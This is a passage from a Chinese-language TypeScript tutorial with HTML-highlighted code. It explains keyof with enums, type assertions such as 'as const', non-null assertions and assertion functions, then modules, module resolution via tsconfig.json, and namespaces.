class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Test</span>;</span><br><span class="line">(<span class="keyword">function</span> (<span class="params">Test</span>) &#123;</span><br><span class="line"> <span class="comment">// 相当于两句赋值：Test[&quot;Apple&quot;] = 0, Test[0] = &quot;Apple&quot;;</span></span><br><span class="line"> <span class="title class_">Test</span>[<span class="title class_">Test</span>[<span class="string">&quot;Apple&quot;</span>] = <span class="number">0</span>] = <span class="string">&quot;Apple&quot;</span>;</span><br><span class="line"> <span class="title class_">Test</span>[<span class="title class_">Test</span>[<span class="string">&quot;Banana&quot;</span>] = <span class="number">1</span>] = <span class="string">&quot;Banana&quot;</span>;</span><br><span class="line">&#125;)(<span class="title class_">Test</span> || <span class="title class_">Test</span> = &#123;&#125;);</span><br></pre></td></tr></table></figure></blockquote></li></ul><h3 id="3-9-3-keyof-关键字与枚举类型"><a href="#3-9-3-keyof-关键字与枚举类型" class="headerlink" title="3.9.3 keyof 关键字与枚举类型"></a>3.9.3 <code>keyof</code> 关键字与枚举类型</h3><p>在 TypeScript 中，<code>keyof</code> 关键字有点类似 Python 的 <code>__dict__</code> 属性，<strong>针对对象 / 类，返回对应类型的所有属性、方法名</strong>，不过 TypeScript 的返回是 “<strong>属性/方法名字符串组成的联合类型</strong>”（就是个字符串枚举类型！），而 Python 返回的是对象数组。</p><p>还有一点值得注意，TypeScript 枚举类型想要使用 <code>keyof</code> 获取成员名字符串联合类型，必须加 <code>typeof</code>：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">MyEnum</span> &#123;</span><br><span class="line">  A = <span class="string">&quot;a&quot;</span>,</span><br><span class="line">  B = <span class="string">&quot;b&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// &#x27;A&#x27;|&#x27;B&#x27;</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Foo</span> = keyof <span class="keyword">typeof</span> <span class="title class_">MyEnum</span>;</span><br></pre></td></tr></table></figure><p>否则会被编译器当作 <code>number</code> 类型：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &quot;toString&quot; | &quot;toFixed&quot; | &quot;toExponential&quot; |</span></span><br><span class="line"><span class="comment">// &quot;toPrecision&quot; | &quot;valueOf&quot; | &quot;toLocaleString&quot;</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Foo</span> = keyof <span class="title class_">MyEnum</span>;</span><br></pre></td></tr></table></figure><h2 id="3-10-TypeScript-的类型断言"><a href="#3-10-TypeScript-的类型断言" class="headerlink" title="3.10 TypeScript 的类型断言"></a>3.10 TypeScript 的类型断言</h2><p>类型断言的存在，允许开发者在代码中“断言”某个值的类型，告诉编译器此处的值是什么类型（而不是改变这个值的类型）。<u>TypeScript 一旦发现存在类型断言，<strong>并且 原类型 兼容 断言的类型</strong>，就不再对该值进行类型推断，而是直接采用断言给出的类型</u>。</p><blockquote><p>再次强调：<strong>断言的前提是 原类型 兼容 断言的类型</strong>！</p></blockquote><p>由于 TypeScript 新版本支持了 React 的 JSX 语法，因此如果你要使用 JSX，则不能用旧语法（<code>&lt;assertType&gt;value</code>，这里的尖括号是真的尖括号），应该使用新语法：<code>value as assertType</code>；</p><p>那么你可能会问，TypeScript 编译器的类型推断不是已经足够了吗？虽然它增强了语言灵活性，但让人来控制类型推断不会导致出错可能性增加？</p><p><strong>确实！它不能乱用，否则会出大问题。</strong></p><p>但是只要在适当的场合使用就能发挥它的优势。以下是常用场景：</p><h3 id="3-10-1-代替明确的类型缩窄"><a href="#3-10-1-代替明确的类型缩窄" class="headerlink" title="3.10.1 代替明确的类型缩窄"></a>3.10.1 代替明确的类型缩窄</h3><p>早在 3.2.5 节中就提到，对于一些联合类型，我们必须使用类型缩窄，才能使用某个特定类型的方法，以此避免运行时的类型错误，如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">doSomething</span>(<span class="params"></span>): <span class="built_in">string</span> | <span class="literal">null</span> &#123;</span><br><span class="line">    <span class="comment">// 可能返回 null，也可能返回 string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> <span class="attr">test</span>: <span class="built_in">string</span> | <span class="literal">null</span> = <span class="title function_">doSomething</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类型缩窄</span></span><br><span class="line"><span class="keyword">if</span> (test !== <span class="literal">null</span>)</span><br><span class="line">    test.<span class="title function_">toUpperCase</span>();</span><br></pre></td></tr></table></figure><p>现在，假设 <strong>我们根据代码逻辑，<u>明确知道</u> <code>test</code> 肯定不会为 <code>null</code>，但是编译器不知道</strong>，还以为可能是 <code>null</code>。</p><p>这个时候我们可以明确告诉编译器，它不可能为 <code>null</code>，于是这么用就无需使用类型缩窄了：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="attr">test</span>: <span class="built_in">string</span> | <span class="literal">null</span> = <span class="title function_">doSomething</span>();</span><br><span class="line"></span><br><span class="line">(test <span class="keyword">as</span> <span class="built_in">string</span>).<span class="title function_">toUpperCase</span>();</span><br></pre></td></tr></table></figure><h3 id="3-10-2-直接量的常量断言"><a href="#3-10-2-直接量的常量断言" class="headerlink" title="3.10.2 直接量的常量断言"></a>3.10.2 直接量的常量断言</h3><h4 id="基本类型直接量"><a href="#基本类型直接量" class="headerlink" title="基本类型直接量"></a>基本类型直接量</h4><p>我们知道，TypeScript 的常量是不能被改变的量，那么常量声明语法 <code>as const</code> 就可以<strong>将基本类型直接量变为对应的值类型</strong>，例如：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&quot;TypeScript&quot;</span> <span class="keyword">as</span> <span class="keyword">const</span>;</span><br></pre></td></tr></table></figure><p>这样在编译时，TypeScript 编译器会将 <code>s</code> 看作 <code>&quot;TypeScript&quot;</code> 值类型。这样有什么用呢？<strong>对 直接量 的常量断言，是<u>看作对应的值类型</u></strong>。例如：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> s = <span class="string">&quot;JavaScript&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Lang</span> = <span class="string">&quot;JavaScript&quot;</span> | <span class="string">&quot;TypeScript&quot;</span> | <span class="string">&quot;Python&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setLang</span>(<span class="params">language: Lang</span>) &#123;</span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setLang</span>(s); <span class="comment">// TypeError</span></span><br></pre></td></tr></table></figure><p>这里 <code>Lang</code> 类型是等价于枚举类型，如果传入普通字符串，即便值和枚举量一致，但编译器没法保证类型正确性。</p><p>所以我们可以这么做：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&quot;JavaScript&quot;</span> <span class="keyword">as</span> <span class="keyword">const</span>;</span><br></pre></td></tr></table></figure><p>这样编译器会将 <code>s</code> 看作 <code>&quot;JavaScript&quot;</code> 值类型，保证以后也不会更改，因此修复了这个问题。当然也与直接用 <code>const</code> 等价：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> s = <span class="string">&quot;JavaScript&quot;</span>;</span><br></pre></td></tr></table></figure><p>不过值得注意的是：<strong>常量断言不能用于 已被赋值（定义）的变量！</strong>因为 TypeScript 不允许中途更改变量的读写性质。</p><h4 id="对象直接量"><a href="#对象直接量" class="headerlink" title="对象直接量"></a>对象直接量</h4><p>如果将 <code>as const</code> 类型断言修饰对象，那么和修饰基本类型直接量的行为就有些不同了。</p><p><u><strong>也就是说，这个时候 <code>const</code> 修饰符和 <code>as const</code> 断言就有区别了！</strong></u></p><ul><li><code>const</code> 修饰对象直接量时，只是不允许更改对象引用，但其中数据可更改（因为是可变数据类型）；</li><li><code>as const</code> 断言对象直接量时，<strong>其中所有数据域 / 成员都改为只读属性</strong>。</li></ul><p>例如：</p><ul><li><p>数组 / 元组直接量 -&gt; <u><strong>只读元组</strong></u>（同时确定了长度、类型 和值）；</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// a1 的类型推断为 number[]</span></span><br><span class="line"><span class="keyword">const</span> a1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// a2 的类型推断为 readonly [1, 2, 3] （元组）</span></span><br><span class="line"><span class="keyword">const</span> a2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>] <span class="keyword">as</span> <span class="keyword">const</span>;</span><br></pre></td></tr></table></figure></li><li><p>对象直接量 -&gt; 数据域全部只读；</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> v1 = &#123;</span><br><span class="line">    <span class="attr">x</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">y</span>: <span class="number">2</span>,</span><br><span class="line">&#125;; <span class="comment">// 类型是 &#123; x: number; y: number; &#125;，普通对象常量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> v2 = &#123;</span><br><span class="line">    <span class="attr">x</span>: <span class="number">1</span> <span class="keyword">as</span> <span class="keyword">const</span>,</span><br><span class="line">    <span class="attr">y</span>: <span class="number">2</span>,</span><br><span class="line">&#125;; <span class="comment">// 类型是 &#123; x: 1; y: number; &#125;，数据域直接量常量断言 的 对象常量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> v3 = &#123;</span><br><span class="line">    <span class="attr">x</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">y</span>: <span class="number">2</span>,</span><br><span class="line">&#125; <span class="keyword">as</span> <span class="keyword">const</span>; <span class="comment">// 类型是 &#123; readonly x: 1; readonly y: 2; &#125;，常量断言 的 对象常量</span></span><br></pre></td></tr></table></figure></li></ul><p>那么这样做有什么用？举个例子：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">x: <span class="built_in">number</span>, y: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">nums</span>: <span class="keyword">readonly</span> <span class="built_in">number</span>[] = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="keyword">const</span> total = <span class="title function_">add</span>(...nums);        <span class="comment">// TypeError</span></span><br></pre></td></tr></table></figure><p>如果我想<strong>将已知长度的数组解构传给函数</strong>，但 <code>const</code> 修饰，甚至是 <code>readonly</code> 修饰，也并不能说明这是个定长度为 2、定内容的数组，只能说明这个数组对象引用不会变，所以编译器认为不行。</p><p>这个时候使用 <code>as const</code> 断言就能提示编译器这个数组是<strong>只读元组</strong>，并且长度为 2，每个位置上的类型都是值类型，能作为参数传递而不出问题。</p><h3 id="3-10-3-非空断言"><a href="#3-10-3-非空断言" class="headerlink" title="3.10.3 非空断言"></a>3.10.3 非空断言</h3><p>和 “明确缩窄类型” 的作用很像，但非空断言只针对 “空类型的类型缩窄”。就是根据代码逻辑，明确知道某些对象的类型不可能为 <code>null / undefined</code>，<strong>在节省不必要的判断的同时，让编译器不报错</strong>。</p><p>但请注意！<strong>一定要确定 “肯定非空” 的逻辑！</strong>否则会出现运行时问题。</p><p><strong>如果不能确保，就请通过手动检查来缩窄类型！</strong></p><p>使用非空断言的语法就是前面提到的：尾缀非空断言运算符 <code>!</code>；</p><p>举个例子：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> root = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;root&quot;</span>)!;</span><br></pre></td></tr></table></figure><p>表示 <code>document</code> 中肯定有 ID 为 <code>root</code> 的元素，不用考虑空的情况了。</p><p>还有种场景是在之前提到过的，如果类中有些属性要在类外、构造函数外初始化，需要给该属性加非空断言，不然编译器认为没有初始化实例属性（如果你的属性定义没有 <code>null</code> 类型的话）而报错：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">  <span class="attr">x</span>: <span class="built_in">number</span>; <span class="comment">// TypeError</span></span><br><span class="line">  <span class="attr">y</span>: <span class="built_in">number</span> | <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// Empty</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">  x!: <span class="built_in">number</span>; <span class="comment">// Correct</span></span><br><span class="line">  <span class="attr">y</span>: <span class="built_in">number</span> | <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// Empty</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-10-4-类型断言函数"><a href="#3-10-4-类型断言函数" class="headerlink" title="3.10.4 类型断言函数"></a>3.10.4 类型断言函数</h3><p>一类函数，如果它的作用是：“保证参数符合某种类型，不符合就抛出错误，符合就什么都不做”，那么就将这类函数称为 “类型断言函数”。</p><p>由于断言函数要么不返回（<code>void</code>），要么抛出错误（<code>never</code>），因此为了断言函数的语义清晰性，TypeScript 3.7 引入了断言函数声明写法，以判断字符串类型为例：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isString</span>(<span class="params">value: <span class="built_in">unknown</span></span>): asserts value is <span class="built_in">string</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> value !== <span class="string">&quot;string&quot;</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Not a string&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样如果断言函数返回结果（不符合断言函数标准的行为），也会报错。</p><p>如果是判断真值（不为 <code>false</code>、<code>undefined</code>、<code>null</code>）的话，断言函数还能更简单地书写：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">assert</span>(<span class="params">condition: <span class="built_in">unknown</span>, message: <span class="built_in">string</span></span>): asserts condition &#123;</span><br><span class="line">    <span class="keyword">if</span> (!condition) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样这个函数就和 Python 的 <code>assert</code> 关键字行为类似了。</p><hr><p>补充：TypeScript 的 <code>is</code> 关键字</p><p>TypeScript 中，<code>is</code> 除了充当类型断言函数的尾缀关系，还能作为<strong>类型判断函数（用于判断参数类型，返回值一定为 <code>boolean</code> 类型）</strong>的尾缀关系，例如：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isFish</span>(<span class="params">pet: Fish | Bird</span>): pet is <span class="title class_">Fish</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> (pet <span class="keyword">as</span> <span class="title class_">Fish</span>).<span class="property">swim</span> !== <span class="literal">undefined</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但 <code>is</code> 关键字也<strong>仅限于</strong>这两类判断函数的尾缀，以此更清晰地表示这类函数的逻辑。</p><h1 id="Chapter-4-TypeScript-模块与命名空间"><a href="#Chapter-4-TypeScript-模块与命名空间" class="headerlink" title="Chapter 4. TypeScript 模块与命名空间"></a>Chapter 4. TypeScript 模块与命名空间</h1><h2 id="4-1-模块"><a href="#4-1-模块" class="headerlink" title="4.1 模块"></a>4.1 模块</h2><h3 id="4-1-1-定义"><a href="#4-1-1-定义" class="headerlink" title="4.1.1 定义"></a>4.1.1 定义</h3><p>TypeScript 文件有 2 类：</p><ul><li>一种是全局的脚本文件。<strong>类似 <code>shell</code> 脚本，其中的变量、函数等等内容可以直接被其他接下来调用的所有文件访问到</strong>；</li><li>另一种是 TypeScript 模块。模块内部的变量、函数、类只在内部可见，对于模块外部是不可见的，这就相当于 C++ 这类语言的普通文件。</li></ul><p>Q: 这两种文件如何区分？</p><p>A: <strong>任何包含 import 或 export 语句的文件，就是一个模块（module）。相应地，如果文件不包含 export 语句，就是一个全局的脚本文件。</strong></p><p>Q: 既然模块对外部具有封装性，那么它们间如何相互调用？</p><p>A: 答案很简单，模块暴露给外部的接口，必须用 <code>export</code> 命令声明；如果其他文件要使用模块的接口，必须用 <code>import</code> 命令来输入。</p><h3 id="4-1-2-特性"><a href="#4-1-2-特性" class="headerlink" title="4.1.2 特性"></a>4.1.2 特性</h3><ul><li><code>export &#123;&#125;;</code> 语句不会进行任何操作，但是这个文件的内部变量对外不再可见；</li><li>TypeScript 允许导入导出 <code>type</code>（类型别名），需要 <code>export type &lt;typename&gt;</code>；</li><li>TypeScript 也允许 <strong>默认导出、命名导出</strong>，用法和 JavaScript 类似；<ul><li><strong>但是导入类型别名时，需要加 <code>type</code> 关键字前缀</strong>；</li><li>导入接口、类时，和 JavaScript 普通对象的导入方法相同；</li></ul></li></ul><h3 id="4-1-3-CommonJS-模块支持"><a href="#4-1-3-CommonJS-模块支持" class="headerlink" title="4.1.3 CommonJS 模块支持"></a>4.1.3 CommonJS 模块支持</h3><p>众所周知，NodeJS 有专门的模块格式，与 ECMAScript 原生脚本不兼容。但是 TypeScript 兼容了 CommonJS 模块的导入：</p><ul><li><code>import &lt;name&gt; = require(&quot;&lt;moduleName&gt;&quot;);</code></li><li><code>export = &lt;exportObj&gt;</code>；</li></ul><h3 id="4-1-4-编译时模块定位-Module-Resolution"><a href="#4-1-4-编译时模块定位-Module-Resolution" class="headerlink" title="4.1.4 编译时模块定位 (Module Resolution)"></a>4.1.4 编译时模块定位 (Module Resolution)</h3><p>几乎所有要编译的语言，其源文件的编译都要考虑一个问题：如何组织模块间相互位置关系、如何找模块 / 库的位置。</p><p>C++ 中，要么你把源文件全部放在固定目录中，然后用相对路径手动引用。<strong>缺点是一改文件位置就要重写，非常麻烦</strong>；另一种方法是 使用 CMake/Makefile 之类的项目管理工具指定编译操作的过程。</p><p>在 TypeScript 中，也有两种方法。</p><h4 id="引用时手动指定模块路径"><a href="#引用时手动指定模块路径" class="headerlink" title="引用时手动指定模块路径"></a>引用时手动指定模块路径</h4><p>我们在引用模块时可能会这么写：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">TypeA</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./a&quot;</span>;    <span class="comment">// 省略后缀名，则可查找 *.ts / *.d.ts / *.tsx</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;/mod&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Component</span> &#125; <span class="keyword">from</span> <span class="string">&quot;@angular/core&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> $ <span class="keyword">from</span> <span class="string">&quot;jquery&quot;</span>;</span><br></pre></td></tr></table></figure><p>前两种利用相对路径指定模块位置的方法是 <strong>相对模块表示法</strong>；</p><p>后两种不带有路径信息地指定模块地方法是 <strong>非相对模块表示法</strong>。</p><p>那么 TypeScript 如何查找以上手动指定的模块？由于 NodeJS 引入的 CommonJS 模块，因此有两种查找方式：一种称为 Classic 方法，另一种称为 Node 方法。可以使用编译参数 <code>moduleResolution</code>，指定使用哪一种方法。</p><p>对于 Classic 方法（原生 JavaScript、TypeScript 默认的方法），步骤就非常简单：</p><ul><li><p>对于相对模块表示法，<strong>按照当前模块的位置为基准路径计算相对路径</strong>；</p><blockquote><p>例如 <code>import &#123; t &#125; from &quot;../t&quot;</code> 就从当前脚本，找上个目录里的 <code>t.ts</code>；</p></blockquote></li><li><p>对于非相对模块表示法，<strong>会以当前模块位置为起点，层层向上查找目录</strong>；</p></li></ul><p>对于 Node 方法就有些复杂：</p><ul><li>对于相对模块表示法，例如 <code>let x = require(&quot;./b&quot;)</code>，会进行以下查找步骤：<ol><li>找当前目录的 <code>b.ts</code>、<code>b.tsx</code>、<code>b.d.ts</code>；</li><li>找当前目录的子目录是否有 <code>package.json</code>，这个文件中有无 <code>types</code> 字段，如果有则递归查找；</li><li>找当前目录的 名为 <code>b</code> 的子目录是否包括 <code>index.ts/.tsx/.d.ts</code>；</li></ol></li><li>对于非相对模块表示法，例如 <code>let x = require(&quot;b&quot;)</code>，会进行以下查找步骤：<ol><li>子目录 <code>node_modules</code> 是否包含 <code>b.ts/.tsx/.d.ts</code>；</li><li>子目录 <code>node_modules</code> 中是否存在 <code>package.json</code>，是否有 <code>types</code> 字段，如果有则递归查找；</li><li>子目录 <code>node_modules</code> 中是否存在子目录 <code>@types</code>，如有，则查找其中的 <code>b.d.ts</code>；</li><li>子目录 <code>node_modules</code> 中是否存在子目录 <code>b</code>，其中是否包括  <code>index.ts/.tsx/.d.ts</code>；</li><li>进入上层目录，充分上述步骤，直至找到。</li></ol></li></ul><h4 id="tsconfig-json-配置模块路径"><a href="#tsconfig-json-配置模块路径" class="headerlink" title="tsconfig.json 配置模块路径"></a><code>tsconfig.json</code> 配置模块路径</h4><p>TypeScript 允许开发者在<code>tsconfig.json</code>文件里面，手动指定脚本模块的路径，这样做在一些大型的、依赖关系复杂的项目中就比较方便。</p><p>有如下配置字段可以设置编译器的查找过程：</p><ul><li><p><code>compilerOptions.baseUrl</code>：指定脚本模块的基准目录（<u>该项目的所有源文件的基准位置都被设置在此</u>）。例如：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;compilerOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;baseUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;.&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>表示将 <code>tsconfig.json</code> 所在的目录为基准目录；</p></li><li><p><code>compilerOptions.paths</code>：<strong>指定<u>非相对路径表示法的模块与实际路径的映射</u></strong>。例如：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;compilerOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;baseUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;.&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;paths&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;jquery&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;node_modules/jquery/dist/jquery&quot;</span><span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>上例的 <code>jquery</code> 属性的值是一个数组，可以指定多个路径。如果第一个脚本路径不存在，那么就加载第二个路径，以此类推。</p></li><li><p><code>compilerOptions.rootDirs</code>：<strong>指定无论查找什么模块，必须要额外查找的其他目录</strong>。例如：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;compilerOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;rootDirs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;src/zh&quot;</span><span class="punctuation">,</span> <span class="string">&quot;src/de&quot;</span><span class="punctuation">,</span> <span class="string">&quot;src/#&#123;locale&#125;&quot;</span><span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li></ul><hr><p>此外，如果你发现自己指定了一些路径，编译器就是找不到。那么你可以使用 <code>--traceResolution</code> 编译器选项，让编译器在命令行中打印搜索的路径，相当于一种调试。</p><h2 id="4-2-命名空间"><a href="#4-2-命名空间" class="headerlink" title="4.2 命名空间"></a>4.2 命名空间</h2><p>评价是和 C++ 的 <code>namespace</code> 很类似。使用也很像：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">Utils</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">isString</span>(<span class="params">value: <span class="built_in">any</span></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">typeof</span> value === <span class="string">&quot;string&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 正确</span></span><br><span class="line">  <span class="title function_">isString</span>(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Utils</span>.<span class="title function_">isString</span>(<span class="string">&quot;no&quot;</span>); <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure><p>哪怕在一个文件中，也必须 <code>export</code> 才能被外部使用：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">Utility</span> &#123;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">log</span>(<span class="params">msg: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(msg);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">error</span>(<span class="params">msg: <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="variable 